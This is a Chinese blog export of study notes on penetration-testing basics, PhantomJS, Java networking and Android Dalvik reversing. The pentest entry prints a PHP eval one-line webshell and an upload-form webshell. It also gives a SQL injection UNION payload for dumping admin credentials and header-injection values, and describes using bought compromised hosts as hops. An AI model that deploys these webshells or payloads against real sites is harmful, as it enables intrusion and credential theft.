    <content type="text"><![CDATA[`测试会用到虚拟机,一般加个内存条就行 `会考试,笔试+机试 被抓的话挂VPN也没用 常用的术语: 1.脚本(asp,php,jsp) --右击看不到源代码 2.html(css,js,html) 3.HTTP协议 --https(加密) --http抓包能抓到账号密码 4.CMS(B/S)(sei mou si) DZ,南方,帝国,思途,dedecms --企业网站用(),医院(织梦:做SU好优化,好推广),学校(织梦),博客(wordpress) --论坛(DZ(discuz)) 5.MD5 --加密算法(不可逆)(哈希值16,32位...)(注入) --20位(去掉前3位,后去1位)(织梦) 6.肉鸡,抓鸡,跳板 --肉鸡:被控的电脑,被黑客入侵并被长期驻扎的计算机或服务器 --抓鸡:控制别人电脑的过程,利用使用量大的程序的漏洞,使用自动化方式获取肉鸡的行为 --跳板:在入侵的时候找一台肉鸡来当跳板,通过肉鸡来入侵 (挂VPN的话,人家就会记录你VPN的IP) (直接入侵,记录的是IP,通过挂个VPN来连接另外一台电脑,通过另外一台电脑来入侵,该电脑就是跳板,记录的是中间的这台电脑IP) 7.一句话,小马,大马 webshell,提权,后门,跳板 Webshell:通过web入侵的一种脚本工具,可以据此对网站服务进行一定程度的控制 --一句话:一句话(木马,比如:asp写&lt;% eval()%&gt;||&lt;?php @eval($_POST[&apos;XXX&apos;]);?&gt;) (预处理前期变量来接收信息.)(参数:也就是密码,菜刀手连接的密码) --小马:之前是用海洋顶端,小马的功能:用来上传大马.两个框,一个保存文件的地址,一个是保存文件的内容.(小马拉大马) &lt;form method=post action=&quot;&quot;//木马地址&gt; &lt;textarea name=cracer&gt; //这里写php代码 phpinfo(); &lt;/textarea&gt; &lt;input type=submit /&gt; &lt;/form&gt; --大马:控制网站不满足,就需要webshell提权到管理员对整个服务器控制.就需要上传大马. --webshell:网站后门,一句话,小马,大马都称webshell. --提权:提升服务器权限.操作系统低权限的账户将自己提升为管理员权限使用的方法 --后门:留后门方便下次进入.有很多种后门.黑客为了对主机进行长期的控制,在机器上种植的一段 程序或留下的一个&quot;入口&quot; --旁站入侵: 即同服务器下的网站入侵,入侵之后可以通过提权跨目录等手段拿到目标 网站的权限.常见的旁站查询工具有:webRobot,御剑,明小子和web在线查询等. --C段入侵: 即同C段下服务器入侵.如目标ip为192.168.1.253入侵192.168.1.*的任意一台机器, 然后利用这些黑客工具嗅探获取在网络上传输的各种信息,常用的工具有:在windows 下有cain,在unix下有snifft,snoop,tcpdump,dsniff等. 8.源码打包,脱裤 --源码打包:下载源码 --脱裤:拖数据库信息(主要拖用户数据) 9.嗅探,rookit --抓包嗅探,网络数据包. --rookit:系统机隐藏后门 (抓3个鸡就要判3-5年)(鸡可以买,看服务器网络接口定位价钱) (海洋cms6.28 做视频的) -&gt;任务: 1.下载各种CMS(php,asp)10-15个,搭建起来 渗透测试流程:(特点:思路+经验) 黑盒测试: 在未授权的情况下,模拟黑客的攻击方法和思维方式,来评估计算机网络系统可能存在的安全风险. 黑盒测试不同于黑客入侵,并不等于黑站.黑盒测试考验的是综合的能力(OS,Datebase,Script,code,思路,社工) -&gt;(给公司写一份报告写出来就ok了) 白盒测试:相对黑盒测试,白盒测试基本是从内部发起. 另一种说法:知道源代码和不知道源代码的渗透测试.白盒偏代码审计. APT攻击: Advanced Persistent Threat,高级可持续性攻击,是指组织或者小团体利用先进的攻击手段对特定目标进行 长期持续性网络攻击的攻击形式. (1).极强的隐蔽性. (2).潜伏期长,持续性强 (3).目标性强 1.明确目标: 确定范围 确定规则 确定需求 2.信息收集: 基础信息 系统信息 应用信息 版本信息 服务信息 人员信息 防护信息 3.漏洞探测 系统漏洞 webServer漏洞 web应用漏洞 其他端口服务漏洞 通信安全 4.漏洞验证 自动化验证 手工验证 试验验证 登陆猜解 业务漏洞验证 公开资源的利用 5.信息分析 精准打击 绕过防御机制 定制攻击路径 绕过检测机制 攻击代码 6.获取所需 实施攻击 获取内部信息 进一步渗透 持续性存在* 清理痕迹 7.信息整理 整理渗透工具 整理收集信息 整理漏洞信息 8.形成报告 按需整理 补充介绍 修补建议 经验分享: 信息搜集 注意搜集0day 流程: 委托受理极端: 受理客户申请-&gt;签署保密协议-&gt;签订合同 评测准备阶段: 编制测评方案-&gt;方案沟通确认 评测实施阶段: 工具扫描-&gt;人工审计 综合评估阶段: 编制测评报告-&gt;报告审批-&gt;报告发送 结题阶段: 报告归档-&gt;报告总结-&gt;客户满意度调查 (VM一般用国外的) (公司教的是业务流程,不是技术流程) (两个标准)(OWASP top 10) 信息收集(占60%-80%) (所有人,cms,后台url,dns,whois查询,端口,,邮箱旁站,C段) (whios-&gt;可以查到注册邮箱,姓名,地址,电话...) (WAF,,工具网站,整站,子域,C段,目录扫描) 漏洞探测 (sql注入,xss,文件上传,下载漏洞,文件包含,变量覆盖,代码执行) 漏洞验证 (poc,尽量不要写exp)(poc漏洞验证,exp漏洞利用) (reg:id=27 and select version(),证明这个漏洞存在) (exp:reg:id=27 union select 1,2,admin,pass from admin)(直接暴露用户名和密码) 学习环境配置: 百度:vmware(官网) -&gt;下载-&gt;点右边第二个-&gt;Desktop-&gt;VMware W P 下载产品 百度:vmware 注册码 1F04Z-6D111-7Z029-AV0Q4-3AEH8 (如果有中断报错,去博客http://www.cracer.com/?post=328)(一个批处理,先运行批处理就能解决了) (要求安装个人系统,win xp,win 7服务器系统,win 03,linux) (linux-&gt;版本:Debian 6) 虚拟机应用配置: (VMware WORKSTATION 12 PRO) (网络,扩容,IIS,系统映射文件) (XP,win7,2003,2008,2012,linux) 网络连通: (网络适配器NAT),虚拟机虚拟出来的网卡 (自定义,桥接,NAT模式) (上网用NAT模式)(cmd-&gt;ncpa.cpl) (属性-&gt;自动获取IP)(指派-&gt;在VM的编辑-&gt;虚拟网络里面查找) (子网IP)(DHCP) (service-&gt;VM-DHCP/NAT-&gt;都要启动)(services.msc) (cmd-&gt;ping-&gt;TTL=128,xp,08一般返回128)(中间经过几个路由器TTL就减多少) (自定义-&gt;VMnet)(编辑-&gt;虚拟网络)(不能上网,仅本机测试) (桥接,发布虚拟机的网站)(虚拟机和物理机在同一个网络.) (物理机物理网络-&gt;ping-&gt;IPv4) (路由器-&gt;端口映射-&gt;搭站)(找了一个access源码-&gt;复制到VM-&gt;192.168.0.104:99) (192.168.0.1-&gt;高级用户-&gt;虚拟服务器-&gt;填一个) (当别人看我IP时,我要映射到VM的IP) (本机IP:99-&gt;可以访问VM的网址) (一定要在路由器上进行,没有路由器就直接访问,二级路由器可以试试ping,能ping通就能找到) (配置虚拟机之后,要点一个快照.之后玩坏就点快照一键恢复) 测试系统的安装: HTTP协议讲解: 403:(页面存在,但是不能访问目录下的内容) http:url(http://host[&quot;:&quot;port][abs_path]) (linux对大小写敏感) (伪静态:其实是动态.reg:xxx.html) (测试:xxx.asp,xxx.jsp,xxx.php aspcms2.0) http头讲解: 200 响应码(代表页面存在) date content-type 类型 cookie -&gt; reg: 浏览器-&gt;工具-&gt;代理-&gt;bp-&gt;抓包 打开安全工具包-&gt;漏洞分析-&gt;burpsuite proxy-&gt;intercept-&gt;intercept is on (x-forwarded-for:)(ip-client)(referer) http请求方法: get,post,options,put,move,delete,trace dz论坛,通过http头突破 访问后台管理系统: Referer:http://xx.xx.x.x:xx/admin/ (写入到数据库中) x-forwarded-for:a.b.c.d&apos; client-ip:a.b.c.d&apos; refere:&apos; 安全狗(走tcp三次握手来获取网站的,而不是http头的)(ack,seq) https协议: http+ssl/tls 网站搭建配置: VM (工具搭) asp-&gt;(小旋风?直接启动) php-&gt;代码审计-&gt;phpStudy2014(可以切换各种版本的php和apache) (IIS搭) VM-&gt;开始-&gt;管理您的服务器-&gt;添加或删除角色-&gt;自定义配置-&gt; IIS-&gt;两个都勾. 安装完成之后-&gt;开始-&gt;管理工具-&gt;IIS-&gt;网站-&gt;默认-&gt;换成源码站 权限-&gt;添加一个everyone asp的话-&gt;web服务扩展-&gt;Active Server Pages启用 网站-&gt;右键-&gt;文档-&gt;全删除-&gt;添加index.asp 主目录-&gt;配置-&gt;选项-&gt;调试-&gt;复选勾选上 php-&gt;zKeysPHP.exe(配搭的是mySQL) IIS-&gt;网站-&gt;新建-&gt;ip,端口(换一个)-&gt;要勾选一个运行脚本(php) 属性-&gt;文档-&gt;index.php-&gt;配置-&gt;映射查看有没有.php php-&gt;添加源码网站-&gt;权限问题就设置源码文件的权限. 新建数据库-&gt;U/P:root/zkeys 属性-&gt;IP-&gt;可以绑定一个 多个IP设置:不自动获取,手写. php属性-&gt;IP-&gt;高级网站标识-&gt;添加]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[本地phantomjs学习列表]]></title>
    <url>%2F2018%2F09%2F10%2F%E6%9C%AC%E5%9C%B0phantomjs%E5%AD%A6%E4%B9%A0%E5%88%97%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[==================================== &quot;use strict&quot;; //引用后js编写进入严格模式 phantomjs test1.js //直接执行js文件 , 并将网页以图片返回 arguments.js //加载参数并循环输出 time_plan.js //定时器 module.js , universe.js //module加载universe里面的answer方法，（模块化） loadspeed.js //简单的加载参数例子 netlog.js //简单的request，response监控 title_test.js //简单的evaluate与onConsoleMessage效果演示 useragent.js //简单的查看useragent，并更改useragent，及其调用js语法 loadjquery.js //简单加载jquery文件用以使用jquery语法 echoToFile.js //简单写入文件 fibo.js //简单的斐波队列 printenv.js //打印环境变量 outputEncoding.js //改变encoding编码打印字 scandir.js.//js列出文件路径名称及子文件路径名称 sleepsort.js //根据它们的值排序整数和延迟显示 version.js //输出phantomjs版本号 color wheel.js //打造一个全色的圆 rasterize.js //将网页栅格化为图像或者pdf render_multi_url.js //将多个网页呈现为图像 injectme.js //将自身js注入网页上下文中 *page_events.js //js黑注入的测试代码 *unrandomize.js //人工修改Math.random函数，并在页面初始化时加载，伪造函数 detectedniff.js //检测网页是否嗅探用户代理 post.js //向测试服务器发送HTTP POST请求 postserver.js //启动一个web服务器并向它发送一个HTTP POST请求 server.js //启动一个web服务器并向它发送一个HTTP GET请求 serverkeepalive.js //启动一个以纯文本回答的web服务器 simpleserver.js //启动一个以HTML格式回答的web服务器 features.js //检测使用的浏览器功能modernizr.js useragent.js //更改浏览器的用户代理属性 run-jasmine.js //运行基于jasmine的测试 run-qunit.js //运行基于Qunit的测试 ====================================]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>前端</category>
        <category>Node</category>
        <category>phantomjs</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>phantomjs</tag>
        <tag>NodeJs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaSE学习笔记01-注解与反射]]></title>
    <url>%2F2018%2F09%2F10%2FJavaSE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001-%E6%B3%A8%E8%A7%A3%E4%B8%8E%E5%8F%8D%E5%B0%84%2F</url>
    <content type="text"><![CDATA[一、java se之注解与反射 1、注解的由来 将不包含业务逻辑的部分，也称作服务或能力， 直接通过标注(注解，Annatation)来定义与识别，不再通过xml等配置。 减少配置量,项目一大配置太多，反而成为负担 2、关于配置与注解 1.1 注解的优势：配置的烦锁与注解的灵活 1.2 注解的劣势：太灵活导致维护性差 1.3 实战项目选择：配置+注解 3、关于反射 3.1 “正射”：通过正常的import等引用，直接new出来的对象。 3.2 “反射”：通过Class字节码对象来实例化其对应的实例。 3.3 强大的反射无处不在，hadoop,nutch,spark等通过配置即可看出大部分应用到反射。 3.4 正向代理与反向代理 正向与反向，你可以认为从客户端角度来说的。 客户端能知道代理的存在，则为正向。那么爬虫代理显然是正向代理 客户端不知道代理的存在，则为反向。apache httpd,nginx均常做反向代理，多用于负载均衡等场景。 4、常用注解 Override：用于检查方法是否被真正准确的重写 Deprecated: 用于标志属性、方法等已经过时，不再建议被使用 SuppressWarnings : 阻止某些情况下的warnning信息 5、元注解：注解的注解 Retention：保持力，保留范围 source: 注解信息只在源文件中 class:在字节码文件中，但不被jvm加载与识别 runtime:在字节码中，被jvm加载，主要用于反射 Target 注解的修饰类型，包括包、类、方法、属性、局部变量等,通过ElementType枚举类来搞定。 Documented 该注解是否也加入到java doc Inherited 该注解能否被继承 5、注解的用法与autowired的简单实现 6、总结 循序渐进，锲而不舍。 细致耐心，高手可成。]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>Java</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaSE学习笔记01--网络编程]]></title>
    <url>%2F2018%2F09%2F10%2FJavaSE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[网络编程(network programming) 1、何为网络遍程 1.1 网络编程是网站、网页编程的底层基础,但与他们不相等、不同。 网络编程，对于高级开发语言面言，多是指基于socket的编程， 也就是面向tcp/udp的编程。 而网页编程，多是面向http协议编程。它是以网络编程为底层基础的。 通过网络编程的参考模型可知。 1.2 网络互联参考模型 1.2.1 学术界的参考模型OSI:open system interconnection 7层：从底向上为： 物理层：封装的底层电气、机械特性，即0、1传输，以bit为单位 数据链路层：是对0、1等最基本单位的封装，成为各种传输单元。 网络层：将下层封装起来的数据单元从src终端传到dst终端。这里只是说计算机之间的到达，即端到端的传输。 传输层：上边是端到端，即机器到机器。该处即为机器内的进程到机器内的进程的传输。 即是tcp/udp编程的所在层。 会话层：维持网络联接的开始、中断、重启。 表示层：为应用层提供加解密、解码等操作。 应用层：如http、ftp、smtp等协议集中在此。像大数数的应用编程多集于此层开发。 工业界的实际参考模型Tcp/IP：tcp and ip protocol group 4层：从底向上： osi的第1、2层合成该层: 网络层： 传输层： osi的第5、6、7层合成该层： 1.2.2 启示 分层的设计架构：到目前也是无处不在，是最主流的解决复杂网络、软件设计等问题的方案，即分层的设计思路。 包括nutch、hadoop、lucene、spark等等均是在不断的分层过程中逐渐发展壮大的。 以及现在java web设计之最流行的MVC，model-view-control，即是经典的分层。 启示结果：解析复杂问题的最有效方法，即是分层架构设计。 1.3 tcp、udp优缺点 tcp:面向链接、可靠的数据传输， 主要在于三次握手，最后有4次握手释放链接。 效率相对低。 应用场景：讲究可靠、有序性，像打电话、QQ聊天、浏览器浏览网页等。 相对来说tcp的应用范围更广。 udp:面向无链接，不可靠的数据传输。 效率相对高。 应用场景：对可靠性要求不高的情况，像语音聊天、游戏场景(war3)等等。 2、难点 2.1 多线程编程 多线程的同步处理 2.2 高效率 并发一高，会导致通讯变慢等情况。 解决这一问题，可以通过java nio编程，即非阻塞方式，即通道channel和选择器selector来搞定。 3、重点 3.1 网络io流的熟练掌握 网络编程，关键就是数据流的传输，故io流要熟练。 3.2 java socket编程api熟练掌握 网络编程的核心包即java.net包，重要api均在此。 4、实战项目 4.1 类QQ群的网络聊天室 4.1.1 面向对象分析： (1)socket server (2)socket client,分两个client。 第1个client,是用户端的client。 第2个client,是服务器的client，是服务器端为了接收与响应客户端的client来初始化工作。 (3)守护线程 daemone thread (4)系统启动器，即controler部分 (5)业务管理器，即manager部分 (6)数据解析类，即发送或接收到的数据的解析 4.2 功能模块划分 (1) 用户端之客户端 * 通过读取console端输入的数据，写给服务器端socket server。 * 读取socket server发过来的消息，构成实际的网络聊天室。 ps: 以上两点要并行执行，即要产生两个线程 (2) 服务器端，做接受和分发客户端 * 通过socket server的accept方法，接受user client，并初始化一个 server端的client与之对应。完成双方的socket读写。 * 读取服务器的console输入,即服务器端要给客户端的消息，并通过守护线程实际写给各user client (3) 服务器端之客户端 * 读取user client的信息，给服务器的消息管理器。最后由守护线程来完成真正的分发。 * 读取服务器端要写给user client的消息，最终通过持有的user client socket的写入流将数据 写给user client端。 统一用语： 用户端的客户端：user client 服务器的客户端：server client 服务器本身： socket server 4.3 类QQ的聊天器。 经过聊天室的程序改造，即可完成该任务。 些任务留做各位同学的课后作业吧，有兴趣的一定要亲自去改改。]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>Java</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaSE学习笔记02--网络编程]]></title>
    <url>%2F2018%2F09%2F10%2FJavaSE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[JavaSE-网络编程 并发一高，会导致通讯变慢等情况。 解决这一问题，可以通过java nio编程，即非阻塞方式，即通道channel和选择器selector来搞定。 NetChartDemo_1 src com.ztl.controler SystemController();//系统启动器 com.ztl.iface.parser IMessageParser(); com.ztl.iface.thread IServerSocketThread(); com.ztl.impl.parser MessageParserImpl(); com.ztl.impl.thread ServerSocketThreadImpl(); //改名为SocketServerRunnableImpl(); ClientSocketRunnable(); //改名为ServerClinetRunnable(); UserClientSocketRunnable(); //copy ClientSocketRunnable(); DaemonThread(); //守护线程部分，负责打印统计信息，报告信息等 com.ztl.manager MessageQueueManager(); //消息队列管理器 MessageParserManager(); //消息解析器 com.ztl.pojos MessageQueuePojo(); //消息队列pojo类 com.ztl.utils SystemParas(); //系统参数配置工具类 ReadConfigUtils(); //读取配置文件的工具类 StaticValue(); //静态变量定义工具类 test //测试 Source Folder resources //配置文件夹 Source Folder application.properties. lib application.properties: #net chat config node_master=true # node_master=false server_socket_port=9999 server_socket_wait_accept_max_pool=5 nick_name=天亮教育 server_socket_ip = 127.0.0.1 max_connection_client_number=10 pubilc class ReadConfigUtil{ private Properties config = null; public ReadConfigUtil(String configFile){ InputStream in = ReadConfigUtil.class.getClassLoader() .getResourceAsStream(&quot;application.properties&quot;); config = new Properties(); try{ Reader reader = new InputStreamReader(in,StaticValue.default_encoding)); config.load(reader); reader.close(); }catch(IOException e){ sout(&quot;none properties&quot;); } } //根据key读取value public String getValue(String key){ // Properties props = new Properties(); try{ String value = config.getProperty(key); return value; }catch(Exception e){ e.printStackTrace(); sout(&quot;ConfigInfoError&quot; + e.toString()); return null; } } psvm(){ sout(); } } public class SystemParas{ //初始化配置文件读取类 public static ReadConfigUtil configUtil = new ReadConfigUtil(&quot;application.properties&quot;); //读取出各配置项，以备任何该项目中的类使用 public static boolean is_node_master = Boolean.parserBoolean(configUtil.getValue(&quot;node_master&quot;)); public static String nick_name = configUtil.getValue(&quot;nick_name&quot;); public static int max_connection_client_number = Integer.parserInt(configUtil.getValue(&quot;max_connection_client_number&quot;)); public static int server_socket_port = Integer.parserInt(configUtil.getValue(&quot;server_socket_port&quot;)); public static int server_socket_wait_accept_max_pool = Integer.parserInt(configUtil.getValue(&quot;server_socket_wait_accept_max_pool&quot;)); public static String server_socket_ip = configUtil.getValue(&quot;server_socket_ip&quot;); main(){ sout(configUtil.getValue(&quot;nick_name&quot;)); sout(configUtil.getValue(&quot;node_master&quot;)); sout(configUtil.getValue(&quot;max_connection_client_number&quot;)); } } public class StaticValue{ public static String default_encoding = &quot;utf-8&quot;; public static String sepratar_next_line = &quot;\n&quot;; } socket server: public interface IServerSocketThread{ } public class ServerSocketThreadImpl implements Runnable{ private String nickName; private ServerSocket serverSocket; private MessageQueueManager messageQueueManager; //private ThreadGroup threadGroup; //线程组，用来统一管理client，socket的各个线程 private List&lt;ServerClientSocketRunnable&gt; serverClientList; private boolean isRunning = true; //状态位 public ServerSocketThreadImpl(String nickName,ServerSocket serversocket){ this.nickName = nickName; this.serverSocket = serverSocket; messageQueueManager = new MessageQueueManager(); //开启管理员向user client端发送消息 AdminWriteMessageRunnable adminWriteMessageRunnable = new AdminWriteMessageRunnable(messageQueueManager); new Thread(adminWriteMessageRunnable).start(); //this.threadGroup = new ThreadGroup(&quot;socket_client_group&quot;); serverClientList = new LinkedList&lt;ServerClientSocketRunnable&gt;(); this.isRunning = true; //在socket server启动守护线程 DaemonThread daemonThread = new DaemonThread(serverClientList,messageQueueManager); new Thread(daemonThread).start(); } setter and getter //实现server socket的主要处理逻辑即可 @Override public void run(){ while(isRunning){ Socket client_socket = null; try{ client_socket = serverSocket.accept(); //下一步封装后再加进线程组 //即server client线程 ClientSocketRunnable clientSocketRunnable = new ClientSocketRunnable( null,client_socket,this.messageQueueManager); this.serverClientList.add(clientSocketRunnable); new Thread(clientSocketRunnable).start(); sout(&quot;one client is online!&quot;); }catch(){ xxx } } } // 管理员要写给各客户端的runnable类 class AdminWriteMessageRunnable implements Runnable{ private MessageQueueManager messageQueueManager; private BufferedReader bufferReader; private boolean isRunnable = true; public AdminWriteMessageRunnable(MessageQueueManager messageQueueManager){ this.messageQueueManager = messageQueueManager; this.isRunnable = true; try{ this.bufferReader = new BufferedReader(new InputStreamReader(System.in.getInputStream(), StaticValue.default_encoding)); }catch(){ xxx } } @Override public void run(){ String temp_line = null; while(isRunnable){ try{ temp_line = this.bufferReader.readLine(); sout(&quot;admin by server to client---&quot; + temp_line); }catch(){ xxx } } } } } //server clinet runnable. 改名为ServerClientSocketRunnable public class ClientSocketRunnable implements Runnable{ private Socket clientSocket; private String nickName; //这里如果想随意写或者随意读，就要独立出来 private BufferedWriter bufferWriter; private BufferedReader bufferReader; setter and getter //封装的由server client向user client发送消息的方法 public void writerToUserClient(String message){ try{ this.bufferWriter.write(message); this.bufferWriter.flush(); }catch(){ xxx } } private MessageParserManager messageParserManager; private boolean isRunnable = true; private MessageQueueManager messageQueueManager; public ClientSocketRunnable(String nickName, Socket clientSocket,MessageQueueManager messageQueueManager){ this.nickName = nickName; this.clientSocket = clientSocket; this.messageParserManager = new MessageParserManager(); this.messageQueueManager = messageQueueManager; this.isRunnable = true; try{ this.bufferReader = new BufferedReader(new InputStreamReader(this.clientSocket.getInputStream(), StaticValue.default_encoding)); this.bufferWriter = new BufferedWriter((new OutputStreamWriter(this.clientSocket.getOutpuStream, StaticValue.default_encoding)); }catch(){ xxx } } @Override public void run(){ String temp_line = null; while(isRunnable){ try{ temp_line = this.bufferReader.readLine(); messageQueueManager.addOneMessage(temp_line); sout(&quot;server from client message----&quot; + temp_line); }catch{ } } } /* class ServerClientWriteRunnable implements Runnable{ private BufferedWriter bufferWriter; public ServerClientWriteRunnable(BufferedWriter bufferWriter){ } } */ } public class UserClientSocketRunnable implements Runnable{ private Socket clientSocket; private String nickName; //这里如果想随意写或者随意读，就要独立出来 private BufferedWriter bufferWriter; private BufferedReader bufferReader; private BufferedReader consoleBufferReader; private MessageParserManager messageParserManager; private boolean isRunnable = true; private MessageQueueManager messageQueueManager; public ClientSocketRunnable(String nickName, Socket clientSocket,MessageQueueManager messageQueueManager){ this.nickName = nickName; this.clientSocket = clientSocket; this.messageParserManager = new MessageParserManager(); this.isRunnable = true; try{ this.consoleBufferReader = new BufferedReader(new InputStreamReader(System.in.getInputStream(), StaticValue.default_encoding)); this.bufferReader = new BufferedReader(new InputStreamReader(this.clientSocket.getInputStream(), StaticValue.default_encoding)); this.bufferWriter = new BufferedWriter((new OutputStreamWriter(this.clientSocket.getOutpuStream, StaticValue.default_encoding)); //开启从服务端读取消息线程 ReadSocketServerRunnable readSocketServerRunnable=new ReadSocketServerRunnable(this.bufferReader); new Thread(readSocketServerRunnable).start(); }catch(){ xxx } } @Override public void run(){ String temp_line = null; while(isRunnable){ try{ temp_line = this.consoleBufferReader.readLine(); this.bufferWriter.write(temp_line + StaticValue.sepratar_next_line); this.bufferWriter.flush(); sout(&quot;client to server message----&quot; + temp_line); }catch{ } } } class ReadSocketServerRunnable implements Runnable{ private BufferedReader bufferReader; private boolean isRunning = true; public ReadSocketServerRunnable(BufferedReader bufferReader){ this.bufferReader = bufferReader(); isRunning = true; } @Override public void run(){ String temp_line = null; while(isRunning){ try{ temp_line = this.bufferReader.readLine(); sout(&quot;server to client---&quot; + temp_line); }catch(){ xxx } } } } } public class DaemonThread implements Runnable{ //持有所有客户端socket线程 //private ThreadGroup threadGroup; private List&lt;ServerClientSocketRunnable&gt; serverClientList; //待向所有客户端发送消息的消息队列管理器 private MessageQueueManager messageQueueManager; private boolean isRunning = true; pubilc DaemonThread(List&lt;ServerClientSocketRunnable&gt; serverClientList,MessageQueueManager messageQueueManager){ //this.threadGroup = threadGroup; this.serverClientList = serverClientList; this.messageQueueManager = messageQueueManager; this.isRunning = true; } @Override public void run(){ String message = null; while(isRunning){ message = messageQueueManager.getOneMessage(); //这里可能会有异常，解决方法：加锁 for(ServerClientSocketRunnable serverClientSocketRunnable:serverClientList){ serverClientSocketRunnable.writeToUserClient(message+StaticValue.sepratar_next_line); } sout(&quot;daemon by server to client-- &quot; + message); } } } public class MessageQueuePojo{ private LinkedList&lt;String&gt; messageList; setter and getter public MessageQueuePojo(){ this.messageList = new LinkedList&lt;String&gt;(); } public void addMessage(String oneMeassage){ sychronized(this){ this.messageList.add(oneMessage); this.notifyAll();//多个用户 } } public String popMessage(){ String message = null; sychronized(this){ message = this.messageList.poll(); while(message == null){ try{ this.wait(); }catch(){ } message = this.messageList.poll(); } return message; } } } pubilc class MessageQueueManager{ private MessageQueuePojo messageQueue; public MessageQueueManager(){ this.messageQueue = new MessageQueuePojo(); } public String getOneMessage(){ return this.messageQueuePojo.popMessage(); } public void addOneMessage(String message){ this.messageQueuePojo.addMessage(message); } } public class SystemController{ psvm(){ if(SystemParas.is_node_master){//说明是服务节点 //port会被绑定，不需要bind ServerSocket serverSocket = new ServerSocket(SystemParas.server_socket_port,SystemParas.server_socket_wait_accept_max_pool) ServerSocketThraadImpl serverSocketRunnable = new ServerSocketThreadImpl( SystemParas.nick_name,serverSocket); Thread serverThread = new Thread(serverSocketRunnable); serverThread.start(); sout(&quot;socket server have started&quot;); }else{//说明是socket client节点 //这里测试的时候，要先开启server服务，再把node_master改为false。当client启动成功的时候，会反馈一条信息给server端 Socket socket = new Socket(SystemParas.server_socket_ip,SystemParas.server_socket_port); ClientSocketRunnnable clientSocketRunnable = new ServerSocketThreadImpl( SystemParas.nick_name,serverSocket); Thread serverThread = new Thread(clientSocketRunnable); serverThread.start(); sout(&quot;socket client have started&quot;); } } } public interface IMessageParser{ public String parser(String message); } public class MessageParserImpl implements IMessageParser{ @Override public String parser(String message){ return null; } } public class MessageParserManager{ private IMessageParser iMessageParser; public MessageParserManager(){ this.iMessageParser = new MessageParserImpl(); } pubilc String parser(String content){ return this.iMessageParser.parser(content); } }]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>Java</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[android逆向学习笔记01]]></title>
    <url>%2F2018%2F09%2F10%2Fandroid%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001%2F</url>
    <content type="text"><![CDATA[android逆向分析-i春秋 基础 bitxiongxi@qq.com //note01 一.Dalvik虚拟机 二.静态分析 三.静态分析应用：应用破解与系统攻击 《Android软件安全与逆向分析》丰生强著 android系统架构： linux内核： （软件与硬件之间的一层，提供驱动） Display Driver Camera Driver Flash Memory Driver Binder(IPC) Driver Keypad Driver WiFi Driver Audio Driver Power Management .... Libraries（系统库）(C/C++写的) Surface Manager Media Framework SQLite OpenGL | ES FreeType WebKit SGL SSL libc (重点)Andrioid Runtime Core Libraries（支持java语言的jar包） Dalvik Virtual Machine （Dalvik虚拟机，类似jvm） （每启动一个程序的时候，都会创建一个Dalvik实例） Application Framework（应用程序框架，一堆API）(正向开发) Activity Manager Window Manager Content Providers View System Package Manager Telephony Manager Resource Manager Location Manager Notification Manager Applications Home Contacts Phone Browser ... Android基础，java基础，信息安全基础 //note02 Dalvik虚拟机（DVM） DVM和JVM的区别： ·JVM运行的是Java字节吗，DVM运行的是Dalvik字节码 ·Dalvik可执行文件（.dex）体积更小 ·虚拟机架构不同：JVM基于栈，DVM基于寄存器（用来暂时存储运算的中间器） reg： Java代码： public class Hello{ public int foo(int a,int b){ return (a+b)*(a-b); } main(){ Hello hello =new Hello(); sout(hello.foo(5,3)); } } (仅针对foo这个函数) Java字节码： public int foo(int,int); Code: 0: iload_1 (i:int;load:将变量的值压到栈上；把第一个值压到栈上) 1: iload_2 2: iadd (栈上的1，2两个值相加,把结果再压出栈) 3: iload_1 4: iload_2 5: isub （相减，压出栈） 6: imul （相乘，相乘） 7: ireturn （返回） Dalvik字节码： Hello.foo:(II)I （函数的定义，II：两个参数都是int类型，I：返回值也是int类型） 0000: add-int v0,v3,v4 （v3和v4的值相加，再将值存到v0里面） 0002: sub-int v1,v3,v4 （相减，存到v1里面） 0004: mul-int/2addr v0,v1 （乘法，然后存到v0里面） 0005: return v0 （返回v0） Dalvik汇编语言简介： v命名法和p命名法 （通常使用的是p命名法） v命名法 p命名法 寄存器含义 v0 v0 第1个局部变量寄存器 v1 v1 第2个局部变量寄存器 ... ... 中间的局部变量寄存器 vM-N p0 第1个参数寄存器（通常为调用对象） ... ... 中间的参数寄存器 vM-1 pN-1 第N个参数寄存器 reg： 3个局部变量和4个函数参数(包括一个this) v0,v1,v2 p0(this),p1,p2,p3 类型描述符： V void Z boolean B byte S short C char I int J long F float D double L java类 [ 数组 寄存器 ·DVM寄存器都是32bit的，与名称无关 ·J，D类型，需要相邻2个寄存器 